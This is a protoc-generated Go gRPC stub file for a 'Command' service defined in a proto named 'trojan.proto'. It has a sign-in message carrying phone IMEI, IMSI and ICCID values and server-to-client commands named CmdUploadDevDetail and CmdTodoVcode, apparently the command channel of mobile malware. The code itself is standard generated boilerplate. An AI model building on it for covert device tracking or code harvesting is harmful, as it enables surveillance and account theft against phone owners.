// Code generated by protoc-gen-go. DO NOT EDIT.
// source: trojan.proto

/*
Package command is a generated protocol buffer package.

It is generated from these files:
	trojan.proto

It has these top-level messages:
	ReqSignin
	RespSignin
	ReportHost
	None
*/
package command

import proto "github.com/golang/protobuf/proto"
import fmt "fmt"
import math "math"

import (
	context "golang.org/x/net/context"
	grpc "google.golang.org/grpc"
)

// Reference imports to suppress errors if they are not otherwise used.
var _ = proto.Marshal
var _ = fmt.Errorf
var _ = math.Inf

// This is a compile-time assertion to ensure that this generated file
// is compatible with the proto package it is being compiled against.
// A compilation error at this line likely means your copy of the
// proto package needs to be updated.
const _ = proto.ProtoPackageIsVersion2 // please upgrade the proto package

type ReqSignin struct {
	Imei  string `protobuf:"bytes,1,opt,name=imei" json:"imei,omitempty"`
	Imsi  string `protobuf:"bytes,2,opt,name=imsi" json:"imsi,omitempty"`
	Iccid string `protobuf:"bytes,3,opt,name=iccid" json:"iccid,omitempty"`
}

func (m *ReqSignin) Reset()                    { *m = ReqSignin{} }
func (m *ReqSignin) String() string            { return proto.CompactTextString(m) }
func (*ReqSignin) ProtoMessage()               {}
func (*ReqSignin) Descriptor() ([]byte, []int) { return fileDescriptor0, []int{0} }

func (m *ReqSignin) GetImei() string {
	if m != nil {
		return m.Imei
	}
	return ""
}

func (m *ReqSignin) GetImsi() string {
	if m != nil {
		return m.Imsi
	}
	return ""
}

func (m *ReqSignin) GetIccid() string {
	if m != nil {
		return m.Iccid
	}
	return ""
}

type RespSignin struct {
	Uid string `protobuf:"bytes,1,opt,name=uid" json:"uid,omitempty"`
}

func (m *RespSignin) Reset()                    { *m = RespSignin{} }
func (m *RespSignin) String() string            { return proto.CompactTextString(m) }
func (*RespSignin) ProtoMessage()               {}
func (*RespSignin) Descriptor() ([]byte, []int) { return fileDescriptor0, []int{1} }

func (m *RespSignin) GetUid() string {
	if m != nil {
		return m.Uid
	}
	return ""
}

type ReportHost struct {
	Host string `protobuf:"bytes,1,opt,name=host" json:"host,omitempty"`
}

func (m *ReportHost) Reset()                    { *m = ReportHost{} }
func (m *ReportHost) String() string            { return proto.CompactTextString(m) }
func (*ReportHost) ProtoMessage()               {}
func (*ReportHost) Descriptor() ([]byte, []int) { return fileDescriptor0, []int{2} }

func (m *ReportHost) GetHost() string {
	if m != nil {
		return m.Host
	}
	return ""
}

type None struct {
}

func (m *None) Reset()                    { *m = None{} }
func (m *None) String() string            { return proto.CompactTextString(m) }
func (*None) ProtoMessage()               {}
func (*None) Descriptor() ([]byte, []int) { return fileDescriptor0, []int{3} }

func init() {
	proto.RegisterType((*ReqSignin)(nil), "command.ReqSignin")
	proto.RegisterType((*RespSignin)(nil), "command.RespSignin")
	proto.RegisterType((*ReportHost)(nil), "command.ReportHost")
	proto.RegisterType((*None)(nil), "command.None")
}

// Reference imports to suppress errors if they are not otherwise used.
var _ context.Context
var _ grpc.ClientConn

// This is a compile-time assertion to ensure that this generated file
// is compatible with the grpc package it is being compiled against.
const _ = grpc.SupportPackageIsVersion4

// Client API for Command service

type CommandClient interface {
	// client-to-server
	Signin(ctx context.Context, in *ReqSignin, opts ...grpc.CallOption) (*RespSignin, error)
	// CMD service
	// server-to-client
	CmdUploadDevDetail(ctx context.Context, in *ReportHost, opts ...grpc.CallOption) (*None, error)
	CmdTodoVcode(ctx context.Context, in *ReportHost, opts ...grpc.CallOption) (*None, error)
}

type commandClient struct {
	cc *grpc.ClientConn
}

func NewCommandClient(cc *grpc.ClientConn) CommandClient {
	return &commandClient{cc}
}

func (c *commandClient) Signin(ctx context.Context, in *ReqSignin, opts ...grpc.CallOption) (*RespSignin, error) {
	out := new(RespSignin)
	err := grpc.Invoke(ctx, "/command.Command/Signin", in, out, c.cc, opts...)
	if err != nil {
		return nil, err
	}
	return out, nil
}

func (c *commandClient) CmdUploadDevDetail(ctx context.Context, in *ReportHost, opts ...grpc.CallOption) (*None, error) {
	out := new(None)
	err := grpc.Invoke(ctx, "/command.Command/CmdUploadDevDetail", in, out, c.cc, opts...)
	if err != nil {
		return nil, err
	}
	return out, nil
}

func (c *commandClient) CmdTodoVcode(ctx context.Context, in *ReportHost, opts ...grpc.CallOption) (*None, error) {
	out := new(None)
	err := grpc.Invoke(ctx, "/command.Command/CmdTodoVcode", in, out, c.cc, opts...)
	if err != nil {
		return nil, err
	}
	return out, nil
}

// Server API for Command service

type CommandServer interface {
	// client-to-server
	Signin(context.Context, *ReqSignin) (*RespSignin, error)
	// CMD service
	// server-to-client
	CmdUploadDevDetail(context.Context, *ReportHost) (*None, error)
	CmdTodoVcode(context.Context, *ReportHost) (*None, error)
}

func RegisterCommandServer(s *grpc.Server, srv CommandServer) {
	s.RegisterService(&_Command_serviceDesc, srv)
}

func _Command_Signin_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
	in := new(ReqSignin)
	if err := dec(in); err != nil {
		return nil, err
	}
	if interceptor == nil {
		return srv.(CommandServer).Signin(ctx, in)
	}
	info := &grpc.UnaryServerInfo{
		Server:     srv,
		FullMethod: "/command.Command/Signin",
	}
	handler := func(ctx context.Context, req interface{}) (interface{}, error) {
		return srv.(CommandServer).Signin(ctx, req.(*ReqSignin))
	}
	return interceptor(ctx, in, info, handler)
}

func _Command_CmdUploadDevDetail_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
	in := new(ReportHost)
	if err := dec(in); err != nil {
		return nil, err
	}
	if interceptor == nil {
		return srv.(CommandServer).CmdUploadDevDetail(ctx, in)
	}
	info := &grpc.UnaryServerInfo{
		Server:     srv,
		FullMethod: "/command.Command/CmdUploadDevDetail",
	}
	handler := func(ctx context.Context, req interface{}) (interface{}, error) {
		return srv.(CommandServer).CmdUploadDevDetail(ctx, req.(*ReportHost))
	}
	return interceptor(ctx, in, info, handler)
}

func _Command_CmdTodoVcode_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
	in := new(ReportHost)
	if err := dec(in); err != nil {
		return nil, err
	}
	if interceptor == nil {
		return srv.(CommandServer).CmdTodoVcode(ctx, in)
	}
	info := &grpc.UnaryServerInfo{
		Server:     srv,
		FullMethod: "/command.Command/CmdTodoVcode",
	}
	handler := func(ctx context.Context, req interface{}) (interface{}, error) {
		return srv.(CommandServer).CmdTodoVcode(ctx, req.(*ReportHost))
	}
	return interceptor(ctx, in, info, handler)
}

var _Command_serviceDesc = grpc.ServiceDesc{
	ServiceName: "command.Command",
	HandlerType: (*CommandServer)(nil),
	Methods: []grpc.MethodDesc{
		{
			MethodName: "Signin",
			Handler:    _Command_Signin_Handler,
		},
		{
			MethodName: "CmdUploadDevDetail",
			Handler:    _Command_CmdUploadDevDetail_Handler,
		},
		{
			MethodName: "CmdTodoVcode",
			Handler:    _Command_CmdTodoVcode_Handler,
		},
	},
	Streams:  []grpc.StreamDesc{},
	Metadata: "trojan.proto",
}

func init() { proto.RegisterFile("trojan.proto", fileDescriptor0) }

var fileDescriptor0 = []byte{
	// 252 bytes of a gzipped FileDescriptorProto
	0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0xff, 0x8c, 0x90, 0x3d, 0x4f, 0xc3, 0x30,
	0x10, 0x86, 0x1b, 0x5a, 0x5a, 0xf5, 0x28, 0x02, 0x1d, 0x0c, 0x51, 0x07, 0x14, 0x79, 0x62, 0xca,
	0x40, 0x99, 0x18, 0x9b, 0x0e, 0xb0, 0xa0, 0x2a, 0x7c, 0xec, 0xc1, 0xb6, 0xe0, 0x50, 0xed, 0x0b,
	0xb1, 0xe1, 0x77, 0xf1, 0x13, 0x91, 0x13, 0xbb, 0xea, 0xc8, 0xf6, 0xfa, 0xb1, 0x7d, 0xef, 0xa3,
	0x83, 0x85, 0xef, 0xf8, 0xb3, 0xb1, 0x65, 0xdb, 0xb1, 0x67, 0x9c, 0x49, 0x36, 0xa6, 0xb1, 0x4a,
	0x3c, 0xc0, 0xbc, 0xd6, 0x5f, 0x4f, 0xf4, 0x6e, 0xc9, 0x22, 0xc2, 0x84, 0x8c, 0xa6, 0x3c, 0x2b,
	0xb2, 0xeb, 0x79, 0xdd, 0xe7, 0x81, 0x39, 0xca, 0x8f, 0x12, 0x73, 0x84, 0x97, 0x70, 0x4c, 0x52,
	0x92, 0xca, 0xc7, 0x3d, 0x1c, 0x0e, 0xe2, 0x0a, 0xa0, 0xd6, 0xae, 0x8d, 0xb3, 0xce, 0x61, 0xfc,
	0x4d, 0x2a, 0x8e, 0x0a, 0x51, 0x14, 0xe1, 0xbe, 0xe5, 0xce, 0xdf, 0xb3, 0xf3, 0x61, 0xee, 0x07,
	0x3b, 0x9f, 0xba, 0x42, 0x16, 0x53, 0x98, 0x3c, 0xb2, 0xd5, 0x37, 0xbf, 0x19, 0xcc, 0xaa, 0x41,
	0x10, 0x57, 0x30, 0x4d, 0x76, 0x65, 0x94, 0x2e, 0xf7, 0xc6, 0xcb, 0x8b, 0x03, 0x96, 0xaa, 0xc5,
	0x08, 0xef, 0x00, 0x2b, 0xa3, 0x5e, 0xda, 0x1d, 0x37, 0x6a, 0xa3, 0x7f, 0x36, 0xda, 0x37, 0xb4,
	0xc3, 0xc3, 0xc7, 0xc9, 0x63, 0x79, 0xba, 0x87, 0xa1, 0x5a, 0x8c, 0xf0, 0x16, 0x16, 0x95, 0x51,
	0xcf, 0xac, 0xf8, 0x55, 0xb2, 0xd2, 0xff, 0xfb, 0xb5, 0x2e, 0xe0, 0xa4, 0x93, 0xae, 0x8c, 0xd6,
	0xeb, 0xb3, 0x5a, 0xba, 0x98, 0xb7, 0x61, 0xe1, 0xdb, 0xec, 0x6d, 0xda, 0x6f, 0x7e, 0xf5, 0x17,
	0x00, 0x00, 0xff, 0xff, 0xcf, 0x74, 0x39, 0x9b, 0x89, 0x01, 0x00, 0x00,
}
